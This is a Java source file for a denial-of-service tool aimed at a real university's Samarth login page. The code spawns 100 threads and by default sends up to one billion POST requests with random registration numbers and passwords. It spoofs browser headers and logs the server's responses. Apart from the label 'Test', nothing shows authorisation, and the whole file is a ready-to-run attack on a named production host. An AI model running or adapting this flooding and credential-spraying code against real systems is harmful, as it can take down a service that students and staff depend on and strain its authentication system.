import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class SamarthLoginDosAttack {
    private static final String API_URL = "https://cuj.samarth.edu.in/index.php/site/login";
    private static final Random random = new Random();

    // Generate random 10-digit registration number
    public static String generateRandomRegNo() {
        StringBuilder regNo = new StringBuilder();
        for (int i = 0; i < 10; i++) {
            regNo.append(random.nextInt(10));
        }
        return regNo.toString();
    }

    // Generate random password (8-12 chars)
    public static String generateRandomPassword() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%";
        StringBuilder password = new StringBuilder();
        int len = 8 + random.nextInt(5);
        for (int i = 0; i < len; i++) {
            password.append(chars.charAt(random.nextInt(chars.length())));
        }
        return password.toString();
    }

    // Build form data for POST
    public static String buildFormData(String regNo, String password) throws UnsupportedEncodingException {
        StringBuilder sb = new StringBuilder();
        sb.append("LoginForm[username]=").append(URLEncoder.encode(regNo, "UTF-8"));
        sb.append("&LoginForm[password]=").append(URLEncoder.encode(password, "UTF-8"));
        sb.append("&login-button=Login");
        return sb.toString();
    }

    // Send POST request
    public static void sendRequest(int requestNumber) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(API_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36");
            connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
            connection.setRequestProperty("Referer", "https://cuj.samarth.edu.in/index.php/site/login");
            connection.setRequestProperty("Origin", "https://cuj.samarth.edu.in");
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false); // We want to see 302
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            String regNo = generateRandomRegNo();
            String password = generateRandomPassword();
            String formData = buildFormData(regNo, password);

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = formData.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            String location = connection.getHeaderField("Location");
            System.out.println("[Request #" + requestNumber + "] Status: " + responseCode +
                " | RegNo: " + regNo + " | Location: " + (location != null ? location : "-") );
        } catch (Exception e) {
            System.err.println("[Request #" + requestNumber + "] Error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    public static void main(String[] args) throws InterruptedException {
        System.out.println("========================================");
        System.out.println("Samarth Login DOS Attack Test");
        System.out.println("========================================");
        System.out.println("Target URL: " + API_URL);
        System.out.println();

        int totalRequests = 1000000000;
        int threadsCount = 100;
        int delayMs = 0;
        if (args.length > 0) totalRequests = Integer.parseInt(args[0]);
        if (args.length > 1) threadsCount = Integer.parseInt(args[1]);
        if (args.length > 2) delayMs = Integer.parseInt(args[2]);

        System.out.println("Configuration:");
        System.out.println("- Total Requests: " + totalRequests);
        System.out.println("- Concurrent Threads: " + threadsCount);
        System.out.println("- Delay between batches: " + delayMs + "ms");
        System.out.println();
        System.out.println("Starting DOS Attack Test...");
        System.out.println("========================================\n");

        ExecutorService executorService = Executors.newFixedThreadPool(threadsCount);
        long startTime = System.currentTimeMillis();

        for (int i = 1; i <= totalRequests; i++) {
            final int requestNumber = i;
            executorService.submit(() -> sendRequest(requestNumber));
            if (i % threadsCount == 0 && delayMs > 0) {
                try { Thread.sleep(delayMs); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
            }
        }

        executorService.shutdown();
        executorService.awaitTermination(10, TimeUnit.MINUTES);

        long endTime = System.currentTimeMillis();
        long totalTime = endTime - startTime;
        System.out.println("\n========================================");
        System.out.println("DOS Attack Test Completed!");
        System.out.println("Total Requests: " + totalRequests);
        System.out.println("Total Time: " + totalTime + "ms");
        System.out.println("Average Time per Request: " + (totalTime / totalRequests) + "ms");
        System.out.println("Requests per Second: " + String.format("%.2f", (totalRequests * 1000.0) / totalTime));
        System.out.println("========================================");
    }
}
